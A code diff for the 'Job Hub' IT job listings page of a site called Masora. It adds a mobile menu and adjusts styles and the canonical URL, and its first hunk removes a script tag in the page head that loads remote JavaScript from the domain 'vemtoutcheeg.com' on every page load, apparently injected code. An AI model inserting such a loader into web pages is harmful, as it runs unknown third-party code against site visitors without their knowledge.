@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-      <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',9547412,document.createElement('script'))</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="index, follow" />
   <meta name="description" content="Find latest fresher IT jobs and connect with Masora for HR services." />
-  <link rel="canonical" href="https://masora.store/p/job-hunt.html" />
+  <link rel="canonical" href="https://masora.store/p/job-hub.html" />
   <title>Job Hub | Masora</title>
 
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -18,6 +17,7 @@
       font-family: 'Segoe UI', sans-serif;
       background-color: #000;
       color: #fff;
+      overflow-x: hidden;
     }
 
     .preloader {
@@ -60,13 +60,13 @@
     }
 
     .logo img {
-      height: 60px;
+      height: 50px;
       margin-right: 10px;
       border-radius: 8px;
     }
 
     .logo span {
-      font-size: 28px;
+      font-size: 24px;
       font-weight: bold;
       color: #FFD700;
     }
@@ -82,12 +82,32 @@
       font-weight: 500;
     }
 
+    .menu-toggle {
+      display: none;
+      font-size: 28px;
+      color: #FFD700;
+      cursor: pointer;
+    }
+
     @media (max-width: 768px) {
       nav {
+        display: none;
         flex-direction: column;
         background: #111;
-        padding: 10px;
+        position: absolute;
+        top: 70px;
+        right: 20px;
+        padding: 15px;
         border-radius: 10px;
+        width: 200px;
+      }
+
+      nav.active {
+        display: flex;
+      }
+
+      .menu-toggle {
+        display: block;
       }
     }
 
@@ -239,7 +259,8 @@
       <img src="/logo.jpg" alt="Masora Logo">
       <span>Masora</span>
     </div>
-    <nav>
+    <div class="menu-toggle" id="menu-toggle"><i class="fas fa-bars"></i></div>
+    <nav id="nav-menu">
       <a href="/">Home</a>
       <a href="/about-us.html">About</a>
       <a href="/job-hub.html">Job Hunt</a>
@@ -248,7 +269,7 @@
     </nav>
   </header>
 
-  <!-- Job Openings -->
+  <!-- Job Listings -->
   <section class="section" data-aos="fade-up">
     <h1>🚀 Latest IT Job Openings</h1>
     <table>
@@ -285,7 +306,7 @@
 
   <!-- CTA Button -->
   <div class="cta-area" data-aos="fade-up">
-    <h2 style="color:#FFD700; margin-bottom:10px;">Are You Hiring?</h2>
+    <h2 style="color:#FFD700;">Are You Hiring?</h2>
     <p style="color:#ccc;">Partner with Masora to find fresh, skilled talent quickly.</p>
     <button class="cta-btn" onclick="openPopup()">Connect with HR Services</button>
   </div>
@@ -319,10 +340,12 @@
   <script>
     AOS.init();
 
+    // Preloader
     window.addEventListener('load', () => {
       document.getElementById('preloader').style.display = 'none';
     });
 
+    // Popup Logic
     function openPopup() {
       document.getElementById("popup").style.display = "flex";
     }
@@ -337,6 +360,11 @@
         popup.style.display = "none";
       }
     };
+
+    // Mobile Menu
+    document.getElementById("menu-toggle").addEventListener("click", function () {
+      document.getElementById("nav-menu").classList.toggle("active");
+    });
   </script>
 </body>
 </html>
